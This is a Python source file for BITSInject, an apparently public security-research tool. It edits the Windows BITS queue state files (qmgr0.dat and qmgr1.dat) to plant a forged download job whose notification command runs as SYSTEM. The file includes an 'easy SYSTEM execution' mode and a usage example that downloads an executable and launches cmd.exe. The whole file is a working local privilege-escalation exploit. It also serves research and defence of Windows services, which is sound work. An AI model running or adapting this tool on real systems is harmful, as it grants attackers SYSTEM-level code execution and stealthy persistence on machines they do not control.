"""
An one-click injection script that safely injects a given job buffer
into the BITS queue (Background Intelligent Transfer Service).

References: * https://github.com/SafeBreach-Labs/BITSInject
            * https://defcon.org/html/defcon-25/dc-25-speakers.html#Azouri
            * https://github.com/SafeBreach-Labs/SimpleBITSServer

Author: Dor Azouri <dor.azouri@safebreach.com>
Date: 2017-04-12T16:41:45Z
"""

import sys
import os
import struct
import subprocess
import traceback
import re
import logging
import argparse
from binascii import crc32
from platform import platform
from _winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE
from uuid import uuid4
from time import sleep

from BITSJobPayloads import SYSTEM_JOB_BASE_HEX

JOB_PAYLOAD_FILE_NAME = "job_payload.mod.hex"
# SC COMMAND CONSTS
SC_STATE_RE = re.compile("STATE.* ([0-9a-zA-Z_]+)")
SC_START_BITS_COMMAND = "sc start bits"
SC_STOP_BITS_COMMAND = "sc stop bits"
SC_QUERY_BITS_COMMAND = "sc query bits"
# LOGGING CONSTS
LOGGING_FORMAT = "[*] %(levelname)s - %(message)s"
LOGGING_MESSAGE_FORMAT = "%(_object)s - %(msg)s"
# GENERAL
INT_SIZE = 0x4
# used for starting the BITS server if needed
SIMPLE_BITS_SERVER_SCRIPT = "SimpleBITSServer.py"
DEFAULT_PORT = 8080
# used for easy SYSTEM execution mode (--S)
RANDOM_FILE_NAME_FORMAT = "%s.file_not_found"
EASY_SYSTEM_EXECUTION_JOB_NAME= "BITSINJECT_EASY_SYSTEM"

# Initialize logging
logging.basicConfig(format=LOGGING_FORMAT, level=logging.DEBUG)
_os_ver = platform()


def os_version_to_global():
    global _os_ver
    if _os_ver.startswith("Windows-7"):
        _os_ver = 7
    elif _os_ver.startswith("Windows-10"):
        _os_ver = 10
    else:
        log_message("OS Version not supported", "init", "error")
        exit()


def log_message(msg, _object_name, level='DEBUG'):
    desired_level = getattr(logging, level.upper())
    logging.log(desired_level, LOGGING_MESSAGE_FORMAT % {'_object': _object_name, 'msg': msg})


class BITS_JOB_STATE:
    Queued = 0
    Connecting = 1
    Transferring = 2
    Suspended = 3
    Error = 4
    TransientError = 5
    Transferred = 6
    Acknowledged = 7
    Cancelled = 8
    Unknown = 9


class BITSStateFile(object):
    """
        A class to represent the pair of BITS state files. Allows several operations such as injection of a new job.
        Works on both files in parallel; changes are only applied on commit.
    """

    # static binary separators in state file
    QUEUE_HEADER_HEX = "47445F00A9BDBA449851C47BB6C07ACE"
    # queue footer OS dependent
    QUEUE_FOOTER_HEX_7 = "47445F00A9BDBA449851C47BB6C0" + \
                         "7ACE47445F00A9BDBA449851C47B" + \
                         "B6C07ACE0000000047445F00A9BD" + \
                         "BA449851C47BB6C07ACE13F72BC8" + \
                         "4099124A9F1A3AAEBD894EEAF56A" + \
                         "192B7C008F438D121CFCA4CC9B76"
    QUEUE_FOOTER_HEX_10 = "47445F00A9BDBA449851C47BB6C0" + \
                          "7ACE47445F00A9BDBA449851C47B" + \
                          "B6C07ACE0000000047445F00A9BD" + \
                          "BA449851C47BB6C07ACE13F72BC8" + \
                          "4099124A9F1A3AAEBD894EEA2832" + \
                          "ED09A6C7E9458F6D36D946C27C3E"
    QUEUE_FOOTER_HEX = {
        7: QUEUE_FOOTER_HEX_7,
        10: QUEUE_FOOTER_HEX_10,
    }
    # job header-footer OS dependent
    JOB_HEADER_FOOTER_HEX_7 = "93362035A00C104A84F3B17E7B499CD7"
    JOB_HEADER_FOOTER_HEX_10 = "B346ED3D3B10F944BC2FE8378BD31986"
    JOB_HEADER_FOOTER_HEX = {
        7: JOB_HEADER_FOOTER_HEX_7,
        10: JOB_HEADER_FOOTER_HEX_10,
    }

    QMGR_DAT_FOLDER_PATH = "C:\\ProgramData\\Microsoft\\Network\\Downloader"
    QMGR0_FILE_NAME = "qmgr0.dat"
    QMGR1_FILE_NAME = "qmgr1.dat"

    REG_BITS_KEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\BITS"
    REG_STATE_INDEX_VALUE = "StateIndex"

    def __init__(self):
        """
            Load state file data
        """
        self._qmgr0_path = os.path.join(BITSStateFile.QMGR_DAT_FOLDER_PATH, BITSStateFile.QMGR0_FILE_NAME)
        self._qmgr1_path = os.path.join(BITSStateFile.QMGR_DAT_FOLDER_PATH, BITSStateFile.QMGR1_FILE_NAME)
        with open(self._qmgr0_path, "rb") as f0:
            original_data_0 = f0.read()
        with open(self._qmgr1_path, "rb") as f1:
            original_data_1 = f1.read()

        self._original_data = original_data_0 \
            if (os.path.getmtime(self._qmgr0_path) > os.path.getmtime(self._qmgr1_path)) \
            else original_data_1
        self._new_data = self._original_data

        self._jobs_counter_off = self._get_jobs_counter_off()
        self._new_job_off = self._get_new_job_off()

    @staticmethod
    def _log_instance_message(msg, level='DEBUG'):
        """
        Convenient wrapper for logging messages with current instance's state file path
        :param msg: text string to appear in log message
        :param level: desired log level for the message
        :return: void
        """
        log_message(msg, "state file", level=level)

    def _update_new_data(self, off, data_to_insert):
        """
        Update the _new_data string in the specified offset.
        The data to be inserted overwrites previous data and should be given as a list of values.
        :param off: start offset in _new_data to insert data into
        :param data_to_insert: data to insert to _new_data
        :return: void
        """
        BITSStateFile._log_instance_message('updating new_data in offset %s' % hex(off))
        self._new_data = override_data(self._new_data, off, data_to_insert)

        if _os_ver == 10:
            decoded_queue_footer = BITSStateFile.QUEUE_FOOTER_HEX[_os_ver].decode('hex')
            crc32_off = self._new_data.find(decoded_queue_footer) + len(decoded_queue_footer)
            crc32_value = struct.pack("i", crc32(self._new_data[:crc32_off]))
            self._new_data = override_data(self._new_data, crc32_off, crc32_value)

    def _get_int(self, off, from_new=False):
        """
        Returns numeric value from an unsigned int that's stored at a given offset in either _new_data or _original_data
        :param off: offset in data in which the int is stored
        :param from_new: whether to get value from _new_data or _original_data
        :return: numeric value of the unsigned int in the given offset
        """
        data_to_access = self._new_data if from_new else self._original_data
        return struct.unpack_from("I", data_to_access[off:off + INT_SIZE])[0]

    def _get_jobs_counter_off(self):
        """
        Get offset inside the state file of the job counter integer
        :return: offset of jobs counter property of the state file
        """
        return self._original_data.find(BITSStateFile.QUEUE_HEADER_HEX.decode("hex")) + \
               len(BITSStateFile.QUEUE_HEADER_HEX.decode("hex"))

    def _get_new_job_off(self):
        """
        Get offset inside the state file of the appropriate place to inject a new job into.
        This is actually the end of the queue.
        :return: offset in state file into which a new job payload can be injected
        """
        global _os_ver
        return self._original_data.find(BITSStateFile.QUEUE_FOOTER_HEX[_os_ver].decode("hex"))

    def _get_job_guid_off(self, guid_string):
        """
        Get offset in state file of the GUID of a job, given the GUID string
        :param guid_string: a GUID string to look for its offset in state file
        :return: offset of the given GUID in the state file
        """
        guidb = BITSJob.guid_string_to_bytes(guid_string)
        return self._original_data.find(guidb)

    def _get_job_state_off(self, job_guid):
        """
        Get offset in state file of the state of a job, given its GUID
        :param job_guid: the BITS job GUID to get its state
        :return: offset of the job's state value in the state file
        """
        # Fixed negative offset from GUID position to job state position
        state_off = self._get_job_guid_off(job_guid) - 0x8
        return state_off

    def get_injected_job_state(self, injected_job_guid):
        """
        Get state of the injected job
        :param injected_job_guid: job GUID to get state of
        :return: state of the job with the given GUID
        """
        state_off = self._get_job_state_off(injected_job_guid)
        state = self._get_int(state_off)
        return state

    def get_jobs_counter(self, from_new=False):
        """
        Get the job counter from the state file data, either from the original data or from the new modified data
        :param from_new: whether to use the original or new data
        :return: the state file job counter
        """
        return self._get_int(self._jobs_counter_off, from_new=from_new)

    def set_jobs_counter(self, new_counter):
        """
        Change the job counter integer of the state file
        :param new_counter: new value to set the job counter
        :return: void
        """
        new_counter_bytes = struct.pack("I", new_counter)
        self._update_new_data(self._jobs_counter_off, new_counter_bytes)

        msg = "Jobs counter changed:\t%s ==> %s" % (self.get_jobs_counter(),
                                                    self.get_jobs_counter(from_new=True))
        BITSStateFile._log_instance_message(msg, level='info')

    def _commit(self):
        """
        Commit _new_data to state file on disk
        :return: void
        """
        BITSStateFile._log_instance_message('committing new_data to both state files', level='info')
        with open(self._qmgr0_path, "wb") as f:
            f.write(self._new_data)
        with open(self._qmgr1_path, "wb") as f:
            f.write(self._new_data)

    def commit(self):
        """
        A wrapper to commit to file that performs retries after wait periods if service is running
        :return: void
        """
        while (True):
            try:
                self._commit()
                BITSStateFile._log_instance_message("committed to files successfully", level='info')
                break
            except IOError as e:
                BITSStateFile._log_instance_message("failed committing to files ... Stopping bits again", level='warning')
                sc_shell_command(SC_STOP_BITS_COMMAND)

    def inject(self, job_hex_string=None, file_path_w_job_to_inject=None):
        """
        Inject the job hex bytes from either the given file path or string into the state file queue.
        If both are given, the string is preferred
        :param job_hex_string: hex string representing the job data
        :param file_path_w_job_to_inject: file path containing a job hex string
        :return: void
        """
        global _os_ver
        if job_hex_string:
            job_data_to_inject = job_hex_string.decode('hex')
        else:
            with open(file_path_w_job_to_inject, "rb") as f:
                job_data_to_inject = f.read().decode('hex')

        self.set_jobs_counter(self.get_jobs_counter() + 1)
        self._update_new_data(self._new_job_off, job_data_to_inject +
                              BITSStateFile.QUEUE_FOOTER_HEX[_os_ver].decode("hex"))

        self.commit()

    def remove_job(self, job_guid):
        """
        Remove a job given its GUID, including decreasing the job counter of the queue
        :param job_guid: the GUID of the job to remove from queue
        :return: void
        """
        global _os_ver
        occurs = [(oc.start(), oc.end()) for oc in
                  list(re.finditer('%s' % (BITSStateFile.JOB_HEADER_FOOTER_HEX[_os_ver].decode('hex')),
                                   self._original_data))
                  ]
        if occurs:
            self.set_jobs_counter(self.get_jobs_counter() - 1)
            state_off = self._get_job_state_off(job_guid)
            new_data_list = list(self._new_data)
            job_start_off, job_end_off = BITSStateFile._get_job_limits_by_index_in_between(occurs, state_off)
            new_data_list = new_data_list[:job_start_off + 1] + new_data_list[job_end_off + 1:]
            self._update_new_data(0, "".join(new_data_list))
            self.commit()

    @staticmethod
    def _get_effective_state_index():
        """
        Get the state file index that's currently in use - deprecated
        :return: index of the current effective state file
        """
        hKey = OpenKey(HKEY_LOCAL_MACHINE, BITSStateFile.REG_BITS_KEY)
        return QueryValueEx(hKey, BITSStateFile.REG_STATE_INDEX_VALUE)[0]

    @staticmethod
    def _get_job_limits_by_index_in_between(occurs, off):
        """
        Find the offsets inside the state file of the start and the end of a job that contains the given index.
        :param occurs: list of tuples each containing start and end offsets of a job in the state file
        :param off: offset in state file inside the desired job
        :return: tuple: (start offset of job, end offset of job)
        """
        occur_index = 0
        occurs_starts = [range_tuple[0] for range_tuple in occurs]
        while off > occurs_starts[occur_index]:
            occur_index += 1
        return occurs[occur_index - 1][0], occurs[occur_index][1]


class BITSJob(object):
    """
        A class to handle a binary-serialized BITS job.
        All changes are volatile until saving to file.
    """

    GUID_OFFSET = 0x20
    DISPLAY_NAME_OFFSET = 0x30

    FILES_HEADER_FOOTER_HEX = "36DA56776F515A43ACAC44A248FFF34D"
    DRIVE_VOLUME_PATH_NEGATIVE_OFFSET = 0xB1

    GUID_SIZE = 0x10
    FILES_HEADER_SIZE = len(FILES_HEADER_FOOTER_HEX) / 2

    def __init__(self, job_hex_string=None, job_hex_file_path=None, job_data=None, job_bin_file_path=None):
        """
        Initialize a class instance, accepting one of the input formats.
        If more than one is given, priority is as follows:
        job_hex_file_path, job_bin_file_path, job_hex_string, job_data
        :param job_hex_string: hex string representing the job data
        :param job_hex_file_path: path to a file containing an hex string representing the job data
        :param job_data: binary data of the job
        :param job_bin_file_path: path to a file containing data of the job
        """
        if job_hex_file_path:
            with open(job_hex_file_path, "rb") as f:
                self._job_data = f.read().strip().decode('hex')
        elif job_bin_file_path:
            with open(job_bin_file_path, "rb") as f:
                self._job_data = f.read().strip()
        elif job_hex_string:
            self._job_data = job_hex_string.decode('hex')
        else:
            self._job_data = job_data

    @staticmethod
    def _string_to_unicode_null_terminated(s):
        """
        Convert standard string to null-terminated "unicode" string
        :param s: input string
        :return: null-terminated unicode format of the given string
        """
        return chr(0).join(list(s)) + 3 * chr(0)

    @staticmethod
    def guid_string_to_bytes(guid_string):
        """
        Encodes a GUID string to binary, using the state file format
        :param guid_string: string of GUID
        :return: the binary bytes that represent the given GUID string, in the state file format
        """
        # 3 first parts needs to be reversed
        data1, data2, data3, data4 = guid_string.split("-")
        data1b = data1.decode('hex')[::-1]
        data2b = data2.decode('hex')[::-1]
        data3b = data3.decode('hex')[::-1]
        data4b = data4.decode('hex')
        return "%s%s%s%s" % (data1b, data2b, data3b, data4b)

    def _set_string_property(self, new_string, old_string_unicode_len, string_off):
        """
        Sets a new string value in a given offset, in the state file format (null-terminated unicode)
        :param new_string: new string value to be set
        :param old_string_unicode_len: length of old string in state file, to be replaced
        :param string_off: offset of the old string in the job data
        :return: void
        """
        new_unicode_len_data = struct.pack("I", len(new_string) + 1)  # unicode null-terminated length
        new_display_name_data = BITSJob._string_to_unicode_null_terminated(new_string)
        new_display_name_struct_data = "%s%s" % (new_unicode_len_data, new_display_name_data)
        self._job_data = replace_data(
            self._job_data,
            string_off - INT_SIZE,
            INT_SIZE + old_string_unicode_len * 2,
            new_display_name_struct_data
        )

    def _null_terminated_unicode_to_string(self, offset, length):
        """
        Return the string value in the given offset (from a null-terminated "unicode" string in state file)
        :param offset: offset of the string in job data
        :param length: length of string in chars
        :return: the string that's in the given offset, in a standard string format
        """
        return self._job_data[offset: offset + length * 2].replace(chr(0), "")

    def _get_first_file_off(self):
        """
        Get the offset of the first file in job data
        :return: offset of the first file in job data
        """
        files_header_off = self._job_data.find(BITSJob.FILES_HEADER_FOOTER_HEX.decode("hex"))

        files_count_off = files_header_off + BITSJob.FILES_HEADER_SIZE
        if struct.unpack_from("I", self._job_data[files_count_off:files_count_off + INT_SIZE])[0] != 1:
            raise Exception("Only single file jobs are supported")

        return files_header_off + BITSJob.FILES_HEADER_SIZE + INT_SIZE

    def _get_files_footer_off(self):
        """
        Get the offset of the files footer in job data
        :return: offset of the files footer in job data
        """
        return self._job_data.rfind(BITSJob.FILES_HEADER_FOOTER_HEX.decode("hex"))

    def _get_int(self, offset):
        """
        Unpack an unsigned int at given offset in job data
        :param offset: offset in job data
        :return: int value from given offset in job data
        """
        return struct.unpack_from("I", self._job_data[offset:offset + INT_SIZE])[0]

    def get_hex_data(self):
        """
        Get the job data, hex encoded
        :return: the job data, hex encoded
        """
        return self._job_data.encode('hex')

    def get_guid(self):
        """
        Get the job's GUID in the state file format
        :return: the job's GUID in the state file format
        """
        guid_data_parts = []
        off = 0
        for sz in (4, 2, 2, 8):  # go over the GUID parts in binary form
            off += sz
            guid_data_parts.append(self._job_data[BITSJob.GUID_OFFSET + (off - sz): BITSJob.GUID_OFFSET + off])
        # 3 first parts needs to be reversed
        data1, data2, data3, data4 = guid_data_parts
        data1h = data1[::-1].encode('hex')
        data2h = data2[::-1].encode('hex')
        data3h = data3[::-1].encode('hex')
        data4h = data4.encode('hex')
        guidh = "%s-%s-%s-%s" % (data1h, data2h, data3h, data4h)

        return guidh.upper()

    def set_guid(self, guid_string):
        """
        Set the job's GUID to the new given GUID string
        :param guid_string: string of the new GUID to set to job
        :return: void
        """
        # 3 first parts needs to be reversed
        guidb = BITSJob.guid_string_to_bytes(guid_string)
        self._job_data = replace_data(
            self._job_data,
            BITSJob.GUID_OFFSET,
            BITSJob.GUID_SIZE,
            guidb
        )

    def _get_remote_url(self):
        """
        Get the RemoteURL property of the job, in the form: (length, string start offset)
        :return: the RemoteURL property of the job, in the form: (length, string start offset)
        """
        file_off = self._get_first_file_off()
        dest_path_unicode_len = self._get_int(file_off)
        remote_url_struct_off = file_off + dest_path_unicode_len * 2 + INT_SIZE
        remote_url_unicode_len = self._get_int(remote_url_struct_off)
        return remote_url_unicode_len, remote_url_struct_off + INT_SIZE  # (length, string start offset)

    def get_remote_url(self):
        """
        Get the RemoteURL property of the job, as a standard string
        :return: the RemoteURL property of the job, as a standard string
        """
        remote_url_unicode_len, remote_url_off = self._get_remote_url()
        return self._null_terminated_unicode_to_string(remote_url_off, remote_url_unicode_len)

    def set_remote_url(self, remote_url_string):
        """
        Set the RemoteURL property of the job to the new given url string
        :param remote_url_string: the new RemoteURL to set to the job
        :return: void
        """
        remote_url_unicode_len, remote_url_off = self._get_remote_url()
        self._set_string_property(remote_url_string, remote_url_unicode_len, remote_url_off)

    def _get_command_line(self):
        """
        Get the CommandLine property of the job, in the form: (length, string start offset)
        :return: the CommandLine property of the job, in the form: (length, string start offset)
        """
        display_name_unicode_len = self._get_int(BITSJob.DISPLAY_NAME_OFFSET)
        description_struct_off = BITSJob.DISPLAY_NAME_OFFSET + display_name_unicode_len * 2 + INT_SIZE
        description_unicode_len = self._get_int(description_struct_off)
        command_line_struct_off = description_struct_off + description_unicode_len * 2 + INT_SIZE
        command_line_unicode_len = self._get_int(command_line_struct_off)
        return command_line_unicode_len, command_line_struct_off + INT_SIZE  # (length, string start offset)

    def get_command_line(self):
        """
        Get the CommandLine property of the job, as a standard string
        :return: the CommandLine property of the job, as a standard string
        """
        command_line_unicode_len, command_line_off = self._get_command_line()
        return self._null_terminated_unicode_to_string(command_line_off, command_line_unicode_len)

    def set_command_line(self, command_line_string):
        """
        Set the CommandLine property of the job to the new given url string
        :param command_line_string: the new CommandLine string to set to the job
        :return: void
        """
        command_line_unicode_len, command_line_off = self._get_command_line()
        self._set_string_property(command_line_string, command_line_unicode_len, command_line_off)

    def _get_dest_path(self):
        """
        Get the DestinationPath property of the job, in the form: (length, string start offset)
        :return: the DestinationPath property of the job, in the form: (length, string start offset)
        """
        file_off = self._get_first_file_off()  # file struct starts with destination path so we use same offset
        dest_path_unicode_len = self._get_int(file_off)
        return dest_path_unicode_len, file_off + INT_SIZE  # (length, string start offset)

    def get_dest_path(self):
        """
        Get the DestinationPath property of the job, as a standard string
        :return: the DestinationPath property of the job, as a standard string
        """
        dest_path_unicode_len, dest_path_off = self._get_dest_path()
        return self._null_terminated_unicode_to_string(dest_path_off, dest_path_unicode_len)

    def set_dest_path(self, dest_path_string):
        """
        Set the DestinationPath property of the job to the new given url string
        :param dest_path_string: the new DestinationPath string to set to the job
        :return: void
        """
        dest_path_unicode_len, dest_path_off = self._get_dest_path()
        self._set_string_property(dest_path_string, dest_path_unicode_len, dest_path_off)

    def _get_drive_volume_path(self):
        """
        Get the DriveVolumePath property of the job, in the form: (length, string start offset)
        :return: the DriveVolumePath property of the job, in the form: (length, string start offset)
        """
        files_footer_off = self._get_files_footer_off()
        drive_volume_path_off = files_footer_off - BITSJob.DRIVE_VOLUME_PATH_NEGATIVE_OFFSET
        drive_volume_path_unicode_len = self._get_int(drive_volume_path_off)
        return drive_volume_path_unicode_len, drive_volume_path_off + INT_SIZE  # (length, string start offset)

    def get_drive_volume_path(self):
        """
        Get the DriveVolumePath property of the job, as a standard string
        :return: the DriveVolumePath property of the job, as a standard string
        """
        drive_volume_path_unicode_len, drive_volume_path_off = self._get_drive_volume_path()
        return self._null_terminated_unicode_to_string(drive_volume_path_off, drive_volume_path_unicode_len)

    def set_drive_volume_path(self, drive_volume_path_string):
        """
        Set the DriveVolumePath property of the job to the new given url string
        :param drive_volume_path_string: the new DriveVolumePath string to set to the job
        :return: void
        """
        drive_volume_path_unicode_len, drive_volume_path_off = self._get_drive_volume_path()
        self._set_string_property(drive_volume_path_string, drive_volume_path_unicode_len, drive_volume_path_off)

    def _get_display_name(self):
        """
        Get the DisplayName property of the job, in the form: (length, string start offset)
        :return: the DisplayName property of the job, in the form: (length, string start offset)
        """
        display_name_unicode_len = self._get_int(BITSJob.DISPLAY_NAME_OFFSET)
        return display_name_unicode_len, BITSJob.DISPLAY_NAME_OFFSET + INT_SIZE  # (length, string start offset)

    def get_display_name(self):
        """
        Get the DisplayName property of the job, as a standard string
        :return: the DisplayName property of the job, as a standard string
        """
        display_name_unicode_len, display_name_off = self._get_display_name()
        return self._null_terminated_unicode_to_string(display_name_off, display_name_unicode_len)

    def set_display_name(self, display_name_string):
        """
        Set the DisplayName property of the job to the new given url string
        :param display_name_string: the new DisplayName string to set to the job
        :return: void
        """
        display_name_unicode_len, display_name_off = self._get_display_name()
        self._set_string_property(display_name_string, display_name_unicode_len, display_name_off)

    def _get_command_args(self):
        """
        Get the CommandLineArgs property of the job, in the form: (length, string start offset)
        :return: the CommandLineArgs property of the job, in the form: (length, string start offset)
        """
        command_line_unicode_len, command_line_off = self._get_command_line()
        command_args_unicode_len = self._get_int(command_line_off + command_line_unicode_len * 2)
        return command_args_unicode_len, command_line_off + command_line_unicode_len * 2 + INT_SIZE

    def get_command_args(self):
        """
        Get the CommandLineArgs property of the job, as a standard string
        :return: the CommandLineArgs property of the job, as a standard string
        """
        command_args_unicode_len, command_args_off = self._get_command_args()
        return self._null_terminated_unicode_to_string(command_args_off, command_args_unicode_len)

    def set_command_args(self, command_args_string):
        """
        Set the CommandLineArgs property of the job to the new given url string
        :param command_args_string: the new CommandLineArgs string to set to the job
        :return: void
        """
        command_args_unicode_len, command_args_off = self._get_command_args()
        self._set_string_property(command_args_string, command_args_unicode_len, command_args_off)

    def write_to_file(self, file_path):
        """
        Write the job data to a given file path
        :param file_path: output file path
        :return: void
        """
        with open(file_path, "wb") as f:
            f.write(self._job_data.encode('hex').upper())


def override_data(original_string, off, string_to_insert):
    """
    Insert a string to a given offset in another original string, overriding previous values.
    The data to be inserted overwrites previous data and should be given as a list of values.
    :param original_string: old string to insert new string into
    :param off: offset in original string to insert new string at
    :param string_to_insert: new string to insert to original string at the given offset
    :return: a new string after insertion
    """
    data_to_insert_list = list(string_to_insert)
    new_data_list = list(original_string)
    try:
        new_data_list[off:off + len(data_to_insert_list)] = data_to_insert_list
    except IndexError as e:
        log_message("String to insert to the original string exceeds original string's length",
                    "utils", "ERROR")
        raise e
    return "".join(new_data_list)


def replace_data(original_string, off, old_len, string_to_insert):
    """
    Replace part of a string with a new string (lengths may be different).
    :param original_string: original string
    :param off: offset in original string to replace data at
    :param old_len: length of the original string
    :param string_to_insert: new string to replace substring with
    :return: a new string after substring replacement
    """
    data_to_insert_list = list(string_to_insert)
    original_data_list = list(original_string)
    new_data_list = original_data_list[:off] + data_to_insert_list + original_data_list[off + old_len:]
    return "".join(new_data_list)


def sc_shell_command(sc_command_string, post_sleep=4):
    """
    Execute an SC (services utility) command in shell, optionally sleeping after to wait for signaling to service
    :param sc_command_string: the command string to execute
    :param post_sleep: time to wait after execution, in seconds
    :return: the state of the service after executing the command
    """
    output = subprocess.check_output(sc_command_string, shell=True)
    state = SC_STATE_RE.findall(output)[0]
    log_message("%s service state: %s" % (sc_command_string.split(" ")[-1], state), "SC", "info")
    sleep(post_sleep)
    return state


def do_inject(injected_job_guid, job_hex_string):
    """
    Perform the injection process
    :param injected_job_guid: GUID of job to inject
    :param job_hex_string: job data to inject
    :return: void
    """
    if sc_shell_command(SC_QUERY_BITS_COMMAND) != "RUNNING":
        sc_shell_command(SC_START_BITS_COMMAND)
    try:
        log_message("-" * 15 + " injection started " + "-" * 15, "injection")
        bsf = BITSStateFile()

        bsf.inject(job_hex_string=job_hex_string)

        if sc_shell_command(SC_QUERY_BITS_COMMAND) != "RUNNING":
            sc_shell_command(SC_START_BITS_COMMAND)

        job_state = bsf.get_injected_job_state(injected_job_guid)
        log_message("-" * 15 + " injection finished " + "-" * 15, "injection")

        log_message("waiting for job {%s} end" % injected_job_guid, "injection")
        while (job_state != BITS_JOB_STATE.Transferred and
                       job_state != BITS_JOB_STATE.Error
               ):
            bsf = BITSStateFile()
            job_state = bsf.get_injected_job_state(injected_job_guid)
            print ".",
            sleep(3)
        print
        log_message("Job terminated with state: %s" % job_state, "injection")

        log_message("-" * 15 + " cleaning started " + "-" * 15, "injection")
        bsf.remove_job(injected_job_guid)
    except Exception as e:
        print traceback.print_exc()
    finally:
        if sc_shell_command(SC_QUERY_BITS_COMMAND) != "RUNNING":
            sc_shell_command(SC_START_BITS_COMMAND)


def generate_random_guid():
    """
    Get a random generated GUID in the state file form:
    XXXXXXXX-XXXX-XXXX-XXXXXXXXXXXXXXXX
       8    - 4  - 4  -       16
    :return:
    """
    uuid_str = str(uuid4()).upper()
    return uuid_str[:23] + uuid_str[24:]


def create_system_job(name, url, dest_path, vol_path, command_line, command_args, dump_to_file):
    """
    Create a BITSJob with the specified properties. Uses a base job data.
    Pass a None argument to leave the original property as it is.
    :param name: name of the job
    :param url: remote URL to download
    :param dest_path: destination path to download file to
    :param vol_path: drive volume path of the download destination
    :param command_line: command line to execute (should be a path of a program)
    :param command_args: arguments for the program to execute, given as a single string
    :param dump_to_file: whether to dump the job's hex data to file (static name in current directory)
    :return: a tuple of (the created job's GUID, the job hex data to be injected into the state file)
    """
    global _os_ver

    job = BITSJob(job_hex_string=SYSTEM_JOB_BASE_HEX[_os_ver])

    new_guid = generate_random_guid()
    job.set_guid(new_guid)
    log_message('Job GUID: %s' % job.get_guid(), "job")

    if name:
        job.set_display_name(name)
    log_message('Display name: %s' % job.get_display_name(), "job")

    if url:
        job.set_remote_url(url)
    log_message('Remote URL: %s' % job.get_remote_url(), "job")

    if dest_path:
        job.set_dest_path(dest_path)
    log_message('Destination path: %s' % job.get_dest_path(), "job")

    if vol_path:
        job.set_drive_volume_path(vol_path)
    log_message('Drive volume path: %s' % job.get_drive_volume_path(), "job")

    if command_line:
        job.set_command_line(command_line)
    log_message('Command Line: %s' % job.get_command_line(), "job")

    if command_args:
        job.set_command_args(command_args)
    log_message('Command Args: %s' % job.get_command_args(), "job")

    if dump_to_file:
        job.write_to_file(JOB_PAYLOAD_FILE_NAME)

    return (new_guid, job.get_hex_data())


def start_bits_server(port=DEFAULT_PORT):
    """
    Start a BITS server of type SimpleBITSServer on specified port, in a subprocess.
    Used to serve the BITS job that was injected to the queue.
    :param port: server port to listen on
    :return: the subprocess that was created
    """
    if not os.path.exists(SIMPLE_BITS_SERVER_SCRIPT):
        log_message("%s must reside in cwd (https://github.com/SafeBreach-Labs/SimpleBITSServer). Terminating..." % SIMPLE_BITS_SERVER_SCRIPT, "bits server", "ERROR")
        exit()
    log_message('Starting BITS server on port: %d' % port, "bits server", "INFO")
    return subprocess.Popen(["python", SIMPLE_BITS_SERVER_SCRIPT, str(port)])

def main(args):
    # first acquire the current OS version into the global var
    os_version_to_global()
    bits_server_proc = None

    if args.S:  # easy SYSTEM execution mode
        from random import random
        args.name = EASY_SYSTEM_EXECUTION_JOB_NAME
        args.cmd = args.S
        if _os_ver == 7:  # on Windows 7 we have to open a background BITS server
            bits_server_proc = start_bits_server()
            random_file_name = RANDOM_FILE_NAME_FORMAT % str(uuid4())[:13]
            args.url = "http://127.0.0.1:%s/%s" % (DEFAULT_PORT, random_file_name)
            args.dest = "%s\\%s" % (os.path.expandvars("%systemdrive%"), random_file_name)
        elif _os_ver == 10:  # on Windows 10, we can cause an error by using a fake random VSN
            args.vol_path = "\\\\?\\Volume{%s}\\" % str(uuid4())
    elif args.localhost_server_port:  # regular mode - start a BITS server only if the user specified
        bits_server_proc = start_bits_server(args.localhost_server_port)

    try:
        job_guid, job_hex_data = create_system_job(args.name, args.url, args.dest, args.vol_path, args.cmd, args.args, args.dump_to_file)
        do_inject(job_guid, job_hex_data)
    finally:
        if bits_server_proc:
            bits_server_proc.kill()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=
                                     'Injects a SYSTEM download job into BITS service queue. Optionally saves job payload to local file: "%s". Can be used in conjuction with SimpleBITSServer and a non-existent URL to get into ERROR mode immediately without downloading a file.' % JOB_PAYLOAD_FILE_NAME,
                                     formatter_class=lambda prog: argparse.HelpFormatter(prog,width=140),
                                     epilog='Usage example: python BITSInject.py I_WANT_YOUR_SYSTEM http://127.0.0.1:8080/exe.exe c:\\temp\\exe.exe "C:\\Windows\\System32\\cmd.exe" --vol_path "\\\\?\Volume{417e8a50-0000-0000-0000-501f00000000}\\\\" --args "C:\\temp\\inputfile.txt" --localhost_server_port 8080')

    parser.add_argument('--S', type=str,
                        help="Easy SYSTEM execution: only need to specify a program to execute")
    parser.add_argument('--name', type=str,
                        help="The job's display name")
    parser.add_argument('--url', type=str,
                        help="Remote URL to download")
    parser.add_argument('--dest', type=str,
                        help="Destination path to save downloaded file into")
    parser.add_argument('--cmd', type=str,
                        help="Program path to execute on job transition into COMPLETED/ERROR state")
    parser.add_argument('--args', type=str,
                        help="Arguments string for the program")
    parser.add_argument('--vol_path', type=str,
                        help="Drive volume path to save downloaded file into, e.g.: '\\\\?\Volume{417e8a50-0000-0000-0000-501f00000000}\\'. On Windows 10, Fill in a fake VSN to shift job immediately into ERROR state without making ANY network traffic. Your notification command line will execute right away")
    parser.add_argument('--localhost_server_port', type=int,
                        help="If specified, a local BITS server will start in background before injection. %s must reside in cwd (https://github.com/SafeBreach-Labs/SimpleBITSServer)" % SIMPLE_BITS_SERVER_SCRIPT)
    parser.add_argument('--dump_to_file', action='store_true', default=False,
                        help="Use to dump created job payload to local file (hex)")

    args = parser.parse_args()

    if not (args.S and not (args.name or args.url or args.dest or args.cmd)) and \
      not (args.name and args.url and args.dest and args.cmd):
        parser.error("Must either use --S ,OR the mandatory set of job properties: name, url, dest, cmd")

    main(args)
